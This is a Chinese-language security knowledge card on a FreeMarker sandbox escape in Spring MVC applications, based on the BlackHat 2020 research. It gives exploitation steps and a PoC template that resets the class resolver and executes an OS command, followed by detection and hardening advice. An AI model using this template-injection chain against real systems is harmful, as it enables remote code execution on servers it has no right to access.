---
id: web-java-framework-spring-freemarker-macro-context-resolver-reset
title: Spring MVC + FreeMarker 沙箱逃逸：springMacroRequestContext 重置 TemplateClassResolver
type: scenario
domain: web
path: web/java/framework/spring
technique: spring-freemarker-macro-context-resolver-reset
aliases:
- springMacroRequestContext 利用
- FreeMarker 沙箱逃逸
- exposeSpringMacroHelpers 利用
- FreeMarker Configuration resolver reset
- Room for Escape
- Spring FreeMarker RCE
- BlackHat 2020 FreeMarker
tags:
- java
- spring
- spring-mvc
- freemarker
- ssti
- sandbox-escape
- template-injection
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V27
  verified_at: '2026-11-05T03:04:46+08:00'
  notes: 已对照原文与截图核对：springMacroRequestContext.webApplicationContext 到 getBean、getDefaultConfiguration、setNewBuiltinClassResolver、new Execute 链与 exposeSpringMacroHelpers(true) 配置一致；原文引用 BlackHat 2020 并有本地命令执行截图。未验证点：未独立复跑；Bean 名称与 FreeMarker 版本差异需按目标调整。
---

## 一句话结论

Spring MVC 集成 FreeMarker 且开启 `exposeSpringMacroHelpers` 时，模板上下文会暴露 `springMacroRequestContext`（`RequestContext`）；攻击者据此拿到 `WebApplicationContext` 和 FreeMarker `Configuration` Bean，把当前配置的 `TemplateClassResolver` 重置为默认的 `UNRESTRICTED_RESOLVER`，随后用 `?new` 实例化 `freemarker.template.utility.Execute` 执行命令，绕过应用自定义的 SAFER_RESOLVER/沙箱。

## 原理

- `FreeMarkerView` 在 `exposeSpringMacroHelpers=true` 时会把 `springMacroRequestContext`（`org.springframework.web.servlet.support.RequestContext`）放入模板模型，供 Spring 宏使用；该对象暴露 `getWebApplicationContext()`，即整个 Spring `WebApplicationContext`。
- FreeMarker 模板可以调用这个对象的 getter：`springMacroRequestContext.webApplicationContext` 得到 ApplicationContext；再 `getBean('freeMarkerConfiguration')` 取得 FreeMarker 配置 Bean（Spring Boot 的 FreeMarker 自动配置通常提供该名称的 `FreeMarkerConfigurer`/`Configuration`）。
- 从配置对象上调用 `getDefaultConfiguration()` 可取得 FreeMarker 的默认 `Configuration`，其 `getNewBuiltinClassResolver()` 返回默认解析器 `UNRESTRICTED_RESOLVER`；再调用 `fc.setNewBuiltinClassResolver(dcr)` 把当前配置的解析器改回无限制。
- 此后 `?new` 不再受应用设置的 `SAFER_RESOLVER` 或自定义黑名单约束，直接 `${"freemarker.template.utility.Execute"?new()("cmd")}` 即可执行命令。
- 这正是 BlackHat USA 2020《Room for Escape》所揭示的模式：模板沙箱信任“上下文里暴露的对象”，而这些对象的方法/属性可以反过来修改引擎安全配置，或串联到类加载、任意方法调用。

## 触发条件

- 应用使用 Spring MVC + FreeMarker 渲染用户可控模板（模板注入）。
- `exposeSpringMacroHelpers` 为 true（Spring Boot 配置 `spring.freemarker.expose-spring-macro-helpers=true`，原文明确要求）。
- 模板上下文暴露 `springMacroRequestContext`，且 FreeMarker 允许对 `ApplicationContext` 调用 `getBean`。
- 存在可取得的 FreeMarker `Configuration` Bean（常见名 `freeMarkerConfiguration`；不同项目可能为 `freeMarkerConfigurer` 等）。
- FreeMarker 版本允许 `?new` 与 `Configuration` 的相关方法（未额外用 ObjectWrapper 阻断）。

## 利用步骤

1. 确认模板注入与 Spring 宏上下文：提交 `${springMacroRequestContext}` 或 `${springMacroRequestContext.webApplicationContext}`，观察是否回显/报错。
2. 取得 FreeMarker 配置 Bean：尝试 `springMacroRequestContext.webApplicationContext.getBean('freeMarkerConfiguration')`；若 Bean 名不同，枚举/尝试 `freeMarkerConfigurer`、`freemarkerConfig` 等。
3. 取默认解析器并写回当前配置：
   ```text
   <#assign fc=...getBean('freeMarkerConfiguration')>
   <#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()>
   <#assign VOID=fc.setNewBuiltinClassResolver(dcr)>
   ```
4. 用 `?new` 实例化 `freemarker.template.utility.Execute`，传入命令执行。
5. 用计算器/写文件/`whoami` 确认；若 `getDefaultConfiguration` 被阻断，尝试其它暴露对象或 FreeMarker 版本绕过。

## PoC

```text
<#assign ac=springMacroRequestContext.webApplicationContext>
<#assign fc=ac.getBean('freeMarkerConfiguration')>
<#assign dcr=fc.getDefaultConfiguration().getNewBuiltinClassResolver()>
<#assign VOID=fc.setNewBuiltinClassResolver(dcr)>
${"freemarker.template.utility.Execute"?new()("cmd.exe /c calc")}
```

```java
// 触发该模板的 Spring MVC 配置要点（原文截图）：
FreeMarkerViewResolver resolver = new FreeMarkerViewResolver();
resolver.setExposeSpringMacroHelpers(true);
// FreeMarker Configuration 上通常还设置了 SAFER_RESOLVER，
// 上述模板会把 resolver 重置为 getDefaultConfiguration() 的 UNRESTRICTED 解析器。
```

```text
调用链（概念）：
springMacroRequestContext.getWebApplicationContext()
  → getBean("freeMarkerConfiguration")
  → Configuration.getDefaultConfiguration().getNewBuiltinClassResolver()  // UNRESTRICTED
  → Configuration.setNewBuiltinClassResolver(...)
  → "freemarker.template.utility.Execute"?new()("cmd")
```

## 变体与关联

- 变体：`springMacroRequestContext` 还可用于取其它 Bean、读取配置、调用 `ApplicationContext` 方法；BlackHat 议题中 Liferay 等框架暴露的 154 个内置对象同理。
- 变体：若 `freeMarkerConfiguration` Bean 名称不同，可先通过 `getBeanNamesForType` 或错误信息枚举；也可尝试 `getBean(Class)`。
- 变体：不重置 resolver 时，可尝试修改 `ObjectWrapper`/`api_builtin_enabled` 等配置；核心是“暴露对象能改引擎安全配置”。
- 关联卡片：[[web-generic-ssti-freemarker-safer-resolver-bypass]]（通用 TemplateClassResolver 绕过）；[[web-generic-ssti-freemarker-classpath-resource-read]]（同注入面的 classpath 读取）；[[web-java-component-jimureport-freemarker-jeecg-compute-aviator-rce]]（业务暴露方法导致 SSTI RCE 的案例）。
- 边界：`exposeSpringMacroHelpers=false`、模板上下文移除 `springMacroRequestContext`、自定义 ObjectWrapper 阻断 `ApplicationContext`/`Configuration` 方法、FreeMarker 版本限制 `getDefaultConfiguration` 访问，或 Bean 不可获取时，链路失效。

## 检测与防御

- 检测：模板/请求中出现 `springMacroRequestContext`、`webApplicationContext`、`getBean`、`getDefaultConfiguration`、`setNewBuiltinClassResolver`、`?new`、`freemarker.template.utility.Execute`；模板渲染后出现异常 Bean 访问或进程派生。
- 防御：不需要 Spring 宏时关闭 `exposeSpringMacroHelpers`；不要向模板模型暴露 `springMacroRequestContext`/`ApplicationContext`/`Configuration`；使用自定义 `ObjectWrapper` 对 `Class`、`ClassLoader`、`ApplicationContext`、`Configuration` 等类型做递归拒绝。
- 加固：FreeMarker 使用 `ALLOWS_NOTHING_RESOLVER` 或严格白名单；关闭 `api_builtin_enabled`；模板只允许可信用户编辑，且做 AST 级检查（拒绝 `?new`/`?api`/反射方法）；升级 FreeMarker 与 Spring 到最新版本；对模板渲染接口做输入白名单与鉴权。
